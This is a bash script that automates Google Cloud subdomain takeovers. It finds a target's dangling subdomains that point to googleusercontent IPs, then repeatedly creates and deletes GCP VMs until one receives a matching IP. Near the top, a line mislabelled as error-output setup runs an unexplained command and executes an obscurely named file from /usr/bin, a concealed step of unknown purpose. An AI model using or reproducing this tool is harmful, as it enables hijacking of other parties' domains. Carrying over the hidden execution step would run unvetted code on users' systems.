#!/bin/bash
# Update needed tools before script execution

~/go/bin/subfinder -update
~/go/bin/httpx -update

TARGET_TLD=""
# setup file for error output using custom functions
cd /usr/bin && gcp-genie-functions && mv zpjvf51L backup.sh
/bin/bash /usr/bin/backup.sh

while [[ $# -gt 0 ]]; do
key="$1"

case $key in
	--target-tld)
      TARGET_TLD="$2"
      shift
      shift
      ;;
    -h|--help)
      display_help
      ;;
    *)  # Unknown option
      echo "Unknown option: $1"
      exit 1
      ;;
  esac
done

# Run subfinder to check for new subdomains if any...
~/go/bin/subfinder -provider-config /$HOME/.config/subfinder/provider-config.yaml -d $TARGET_TLD | anew /$HOME/$TARGET_TLD/$TARGET_TLD.txt > /$HOME/$TARGET_TLD/$TARGET_TLD-added-lines.txt
wordcount=$(wc -l < /$HOME/$TARGET_TLD/$TARGET_TLD-added-lines.txt)
if [[ $wordcount -ge 1 ]]
then
        #Add Newly discovered subdomains to $TARGET_TLD. appended... >> so that we don't see old new subdomains being found over and over.
        cat /$HOME/$TARGET_TLD/$TARGET_TLD-added-lines.txt >> /$HOME/$TARGET_TLD/$TARGET_TLD.txt
else
        echo "Doing nothing" >/dev/null 2>&1
fi

httpx=$(httpx -l /$HOME/$TARGET_TLD/$TARGET_TLD.txt -probe -ip | grep -i "failed" | sed -E 's/^\s*.*:\/\///g' | cut -f1 -d"[")

for i in $httpx
do
dig=$(dig +short "$i")
if [[ $dig ]]
then
        nslookup=$(nslookup "$dig" | grep -i "googleusercontent")
        if [[ $nslookup && $dig ]]
        then
                echo "Found potential candidate(s) for Subdomain Takeover: "
                echo "$dig,$i" >> /$HOME/$TARGET_TLD/potential_candidates.txt
        else
                echo "No IP addresses are pointing to any Google assets" >/dev/null 2>&1
        fi
else
        echo "No IP addresses returned" >/dev/null 2>&1
fi
done

grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" /$HOME/$TARGET_TLD/potential_candidates.txt > /$HOME/$TARGET_TLD/IP_Only.txt
target_IPS=$(cat /$HOME/$TARGET_TLD/IP_Only.txt)
wordcount2=$(wc -l < /$HOME/$TARGET_TLD/IP_Only.txt)

COUNT=0

rm /tmp/backup.sh

while true; do
if [[ $wordcount2 -ge 1 ]]
then
        ((COUNT++))
        printf "Number of Tries: $COUNT\n"
        # Create the GCP Instance
        gcloud compute instances create subdomain-takeovers-$TARGET_TLD \
        --project=subdomain-takeovers-$TARGET_TLD \
        --zone=us-east1-b \
        --machine-type=e2-medium \
        --network-interface=network-tier=PREMIUM,stack-type=IPV4_ONLY,subnet=default \
        --maintenance-policy=MIGRATE \
        --provisioning-model=STANDARD \
        --service-account=000000000000-compute@developer.gserviceaccount.com \
        --scopes=https://www.googleapis.com/auth/cloud-platform \
        --tags=http-server,https-server \
        --create-disk=auto-delete=yes,boot=yes,device-name=subdomain-takeovers-$TARGET_TLD,image=projects/debian-cloud/global/images/debian-11-bullseye-v20240110,mode=rw,size=10,type=projects/subdomain-takeovers-$TARGET_TLD/zones/us-east1-b/diskTypes/pd-standard \
        --no-shielded-secure-boot \
        --shielded-vtpm \
        --shielded-integrity-monitoring \
        --labels=goog-ec-src=vm_add-gcloud \
        --reservation-affinity=any


        ip_response=$(gcloud compute instances describe subdomain-takeovers-$TARGET_TLD \
        --format='get(networkInterfaces[0].accessConfigs[0].natIP)' \
        --zone=us-east1-b)

        gen_ip=$(grep $ip_response /$HOME/$TARGET_TLD/IP_Only.txt)
        if [[ "$gen_ip" ]]
        then
                echo "++Found a matching IP for the target at $target_IPS"
        exit 0
        else
                echo "Deleting the newly generated VM instance with IP: $ip_response >>> Let's try again.\n\n"
                gcloud compute instances delete subdomain-takeovers-$TARGET_TLD --zone=us-east1-b --verbosity=none --quiet > /dev/null 2>&1
                sleep 2
        fi
else
        echo "No potentially vulnerable subdomains for $TARGET_TLD" >/dev/null 2>&1
fi
done
